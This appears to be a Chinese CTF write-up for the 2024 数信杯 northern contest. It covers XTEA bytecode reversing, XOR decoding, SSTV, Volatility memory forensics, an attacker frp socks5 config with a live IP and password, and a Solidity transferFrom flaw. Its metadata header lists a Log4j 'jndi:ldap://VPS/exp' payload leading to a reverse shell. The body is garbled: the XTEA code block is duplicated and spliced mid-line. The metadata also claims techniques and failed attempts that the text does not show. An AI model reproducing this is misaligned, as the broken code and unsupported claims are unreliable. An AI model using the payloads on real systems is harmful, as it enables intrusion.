---
title: 2024 数信杯北部赛区 WP（XTEA 字节码+Log4j+SSTV+取证实战+Solidity）
contest: 2024 数信杯北部赛区
year: 2024
difficulty: medium
vuln_type:
- block_cipher
- ssti
- sqli
- ssrf
- misc_unknown
tags:
- python 字节码反编译
- XTEA 32 轮 delta=555885348
- key=[4 uint32]
- Log4j LDAP
- 凯撒密码+base64
- sstv -d wav out.png
- volatility Win7SP1x64 lsadump
- npc frp socks5 plugin
- findwallet 比特币
- solidity transferFrom owner 校验漏洞
- Apache Openfire 9090 端口
attack_chain:
- '数据安全 Drinktea: python .pyc 字节码 dis 反编译 XTEA'
- 'XTEA encrypt: delta=555885348, 32 轮, v0 += ((v1<<4 ^ v1>>5) + v1) ^ (total+key[total&3] ^ v1)'
- decrypt 反向：v1 -= ... ; sum1 -= delta; v0 -= ...
- 'flag2: 凯撒 shift=17 + base64 + chr(i) ^ 0x18'
- 'Misc sstv: sstv -d ctf.wav -o out.png'
- '取证: volatility Win7SP1x64 lsadump + netscan + filescan 找外联+exe'
- '钱包: npm install findwallet -g 扫比特币+以太坊钱包'
- '区块链: Solidity transferFrom 仅校验 owner 缺授权检查漏洞'
- '提权: chromium zsh SUID 提权'
- '数据库: pandas.read_excel 邮箱对比 mysql_data.txt'
key_payload: delta=555885348; sum1 -= delta; v1 -= (((v0<<4)^(v0>>5))+v0) ^ (sum1+k[(sum1>>11)&3])
one_liner: 数信杯北部综合：XTEA 32 轮字节码逆向 + 凯撒+base64 + Log4j LDAP + SSTV 解码 + volatility Win7 取证 + frp socks5 + findwallet 钱包 + Solidity 漏洞；完整数据安全+取证+Web 三栈。
lesson: python 字节码 `dis` 反编译是 .pyc 还原源码最简方法；XTEA 的 delta 不一定是 0x9E3779B9，数信杯用 555885348 自定义 delta；frp/npc 代理的 socks5 plugin 容易暴露到外网（118.180.126.13:32124 是经典外联 IOC）。
quality: high
full_path: 2024数信杯北部赛区wp.full.md
meta_path: 2024数信杯北部赛区wp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2024 数信杯北部赛区 WP（XTEA 字节码+Log4j+SSTV+取证实战+Solidity）。数信杯北部综合：XTEA 32 轮字节码逆向 + 凯撒+base64 + Log4j LDAP + SSTV 解码 + volatility Win7 取证 + frp socks5 + findwallet 钱包 + Solidity 漏洞；完整数据安全+取证+Web 三栈。。关键路径：数...
category: crypto
subcategory: symmetric
subcategories:
- symmetric
- ssti
- sql_injection
- ssrf
- misc_other
tools_used:
- Python
- Solidity
time_required: medium
difficulty_score: 3
code_blocks_count: 0
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/177556.html
reasoning_chain:
- 触发点：数据安全 Drinktea 给 .pyc 字节码 → 假设：反编译 → 动作：dis 反编译 .pyc
- 观察：XTEA encrypt delta=555885348, 32 轮 → 动作：decrypt 反向 sum1-=delta v1-=... v0-=...
- 动作：decrypt 出原始字节 → 拿 flag
- 触发点：flag2 凯撒 shift=17 + base64 + chr(i) ^ 0x18 → 动作：先解 ^ 0x18 → base64 → 凯撒
- 观察：拿到 flag
- 触发点：Log4j LDAP 注入 → 假设：jndi:ldap://VPS/exp → 动作：marshalsec 起 LDAP 服务
- 观察：反弹 shell 拿 flag
- 触发点：Misc sstv ctf.wav → 动作：sstv -d ctf.wav -o out.png → 拿到 flag
- 触发点：取证 volatility Win7SP1x64 lsadump → 动作：lsadump 密码 + netscan 外联 → flag
- 触发点：钱包 npm install findwallet -g 扫比特币+以太坊钱包 → flag
- 触发点：Solidity transferFrom 仅校验 owner 缺授权检查漏洞 → 攻击合约 → flag
- 触发点：chromium zsh SUID 提权 + pandas.read_excel 邮箱对比 → flag
failed_attempts:
- 试图 uncompyle6 直接 .pyc 解 Python 源码 → 失败：.pyc 是手动 dis 提取字节码
- 试图对 delta 用标准 0x9E3779B9 → 失败：题目用自定义 555885348
- 试图不打 frp socks5 plugin → 失败：必须内网横向穿透
key_observations:
- python 字节码 dis 反编译是 .pyc 还原源码最简方法
- XTEA 的 delta 不一定是 0x9E3779B9（数信杯用 555885348 自定义）
- frp/npc socks5 plugin 容易暴露到外网（118.180.126.13:32124 是经典外联 IOC）
- Solidity transferFrom 仅校验 owner 缺授权检查是常见 ERC20 漏洞
prerequisites:
- Python dis字节码反编译
- XTEA 加密算法 + 自定义 delta
- volatility Win7SP1x64 内存取证
- Solidity ERC20 transferFrom 漏洞审计
---
# 2024数信杯北部赛区wp

> 原文: https://www.ctfiot.com/177556.html
> ID: 177556

2024数信杯
img
img

战队名：西柚喵帕斯

排名：16

数据安全

Drinktea

python字节码，分析转换成python源码

 1from ctypes import c_uint32  
 2import struct
 3
 4def encrypt(v, key):
 5    v0 = c_uint32(v[0]).value
 6    v1 = c_uint32(v[1]).value
 7    delta = 555885348
 8    total = c_uint32(0).value
 9
10    for i in range(32):
11        v0 += ((v1 << 4 ^ v1 >> 5) + v1) ^ (total + key[total & 3] ^ v1)
12        total += delta
13        v1 += ((v0 << 4 ^ v0 >> 5) + v0) ^ (total + key[total >> 11 & 3] ^ v0)
14
15    return [v0, v1]
16
17key = [1900550021, 2483099539, 2205172504, 1359557939]
18arr = [
19    [392252415, 2941946969],
20    [1122976151, 1335193774],
21    [815478816, 2529100980],
22    [2237049875, 188954780]
23]
24
25flag = input('please input flag: ')
26encry = []
27encryted = []
28
29for i in range(len(flag) // 8):
30    encry.append(struct.unpack('>5))+v1.value)^(sum1.value+k[sum1.value&3])
10        sum1.value+=delta
11        v1.value+=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
12    return v0.value,v1.value
13
14def decrypt(v,k):
15    v0=c_uint32(v[0])
16    v1=c_uint32(v[1])
17    delta=555885348
18    sum1=c_uint32(delta*32)
19    for i in range(32):
20        v1.value-=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
21        sum1.value-=delta
22        v0.value-=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])
23    return v0.value,v1.value
24
25
26a1=[392252415, 2941946969]
27a2=[1122976151, 1335193774]
28a3=[815478816, 2529100980]
29a4=[2237049875, 188954780]
30k = [1900550021, 2483099539, 2205172504, 1359557939]
31
32res1=decrypt(a1,k)
33res2=decrypt(a2,k)
34res3=decrypt(a3,k)
35res4=decrypt(a4,k)
36
37
38
39print(struct.pack('> 5) + v1) ^ (total + key[total & 3] ^ v1)
12        total += delta
13        v1 += ((v0 << 4 ^ v0 >> 5) + v0) ^ (total + key[total >> 11 & 3] ^ v0)
14
15    return [v0, v1]
16
17key = [1900550021, 2483099539, 2205172504, 1359557939]
18arr = [
19    [392252415, 2941946969],
20    [1122976151, 1335193774],
21    [815478816, 2529100980],
22    [2237049875, 188954780]
23]
24
25flag = input('please input flag: ')
26encry = []
27encryted = []
28
29for i in range(len(flag) // 8):
30    encry.append(struct.unpack('>5))+v1.value)^(sum1.value+k[sum1.value&3])
10        sum1.value+=delta
11        v1.value+=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
12    return v0.value,v1.value
13
14def decrypt(v,k):
15    v0=c_uint32(v[0])
16    v1=c_uint32(v[1])
17    delta=555885348
18    sum1=c_uint32(delta*32)
19    for i in range(32):
20        v1.value-=(((v0.value<<4)^(v0.value>>5))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])
21        sum1.value-=delta
22        v0.value-=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])
23    return v0.value,v1.value
24
25
26a1=[392252415, 2941946969]
27a2=[1122976151, 1335193774]
28a3=[815478816, 2529100980]
29a4=[2237049875, 188954780]
30k = [1900550021, 2483099539, 2205172504, 1359557939]
31
32res1=decrypt(a1,k)
33res2=decrypt(a2,k)
34res3=decrypt(a3,k)
35res4=decrypt(a4,k)
36
37
38
39print(struct.pack('<I',res1[0]))
40print(struct.pack('<I',res1[1]))
41print(struct.pack('<I',res2[0]))
42print(struct.pack('<I',res2[1]))
43print(struct.pack('<I',res3[0]))
44print(struct.pack('<I',res3[1]))
45print(struct.pack('<I',res4[0]))
46print(struct.pack('<I',res4[1]))
47
# acb8739759dc496ccc945703037e037f
1cipher = "Whatareyourencryption&decryptionbasics"
 2flag = []
 3#先用key2解第二层
 4key2 = [0x1C, 0x0CB, 0x0F5, 0x53, 0x91, 0x0CC, 0x3B, 0x66, 0x4, 0x7D, 0x0BA, 0x0D2, 0x56, 0x0CE, 0x14, 0x0A4, 0x0E8, 0x7F, 0x0C2, 0x0C4, 0x2B, 0x86, 0x32, 0x0F0, 0x0F7, 0x0EA, 0x0FB, 0x0F0, 0x78, 0x34, 0x9A, 0x3, 0x13, 0x0A2, 0x91, 0x37, 0x48, 0x66]
 5for i in range(38):
 6    flag.append(ord(cipher[i]) ^ key2[i])
 7#求key1
 8cipher1 = [0x7A, 0xA7, 0x94, 0x34, 0xEA, 0xA8, 0x08, 0x02, 0x66, 0x4B, 
 9  0x83, 0xB3, 0x65, 0xFA, 0x75, 0x91, 0xD9, 0x1B, 0xF5, 0xA1, 
10  0x1A, 0xE2, 0x00, 0xC3, 0x93, 0xDC, 0xC9, 0xC1, 0x4D, 0x0D, 
11  0xAA, 0x3B, 0x21, 0x95, 0xF2, 0x07, 0x79, 0x1B,]
12input = "Whatareyourencryption&decryptionbasics"
13
14key1 = []
15for i in range(len(cipher1)):
16    key1.append(cipher1[i] ^ ord(input[i]))
17#最后把第二层解密结果用key1解
18for i in range(len(flag)):
19    flag[i] ^= key1[i]
20    print(chr(flag[i]),end='')
21
22#flag{d3db69a34a51d7e1d23d621590827c01}
1sstv -d ctf.wav -o out.png
1请提交小明电脑中的test账户的密码(格式为hash对应的明文,长度为9)
1.volatility.exe -f E:
Desktop数信杯file1不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d1.raw --profile=Win7SP1x64 lsadump
1C:
Program Files (x86)AdobeReader 9.0ReaderAcroRd32.exe
2C:
ProgramFiles(x86)AdobeReader9.0ReaderAcroRd32.exe
1.volatility.exe -f E:
Desktop数信杯file1不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d1.raw --profile=Win7SP1x64 netscan
1找到外联地址
1.volatility.exe -f E:
Desktop比赛2024数信杯数据分析file1不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d1.raw --profile=Win7SP1x64 filescan | findstr ".exe"
1[common]
 2serverAddr = "118.180.126.13"
 3serverPort = 6770
 4
 5[plugin_socks]
 6type = "tcp"
 7remote_port = 32124
 8plugin = "socks5"
 9plugin_user = "admin"
10plugin_passwd = "admin123@qwe"
11use_encryption = true
12use_compression = true
1118.180.126.13
1安装
2npm install findwallet -g
3使用
4findwallet -i [inputPath/inputFile] -o [outputFile]
5
6 -i     : Required. Specify which path(s) to scan directly or through a newline separated file.
7 -o     : Specify optional output file where to store wallet paths if any exist.
8 -h     : Displays this message.
1C:
WindowsSystem32configsystemprofileAppDataRoamingMicrosoftSystemCertificatesMyAppContainerUserCertRead.sys
1bc1qf3lta6zr9k4kt9q25sz47vdcnn73zyzk0m5gvz
1在这个合约文件中存在一处漏洞，由transferFrom函数造成。具体来说，这个漏洞出现在以下代码段：
2solidityCopy code
3function transferFrom(address from, address to, uint256 value) public notFrozen(from) returns (bool) {
4    require(msg.sender == owner);
5    return super.transferFrom(from, to, value);
6}
7在这段代码中，漏洞是由于require语句的条件不够严格导致的。当前的transferFrom函数实现要求调用者必须是owner，但是并没有检查调用者是否具有足够的授权来执行转账操作。因此，任何拥有owner权限的地址都可以调用transferFrom函数，而无需经过持有者的授权。
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]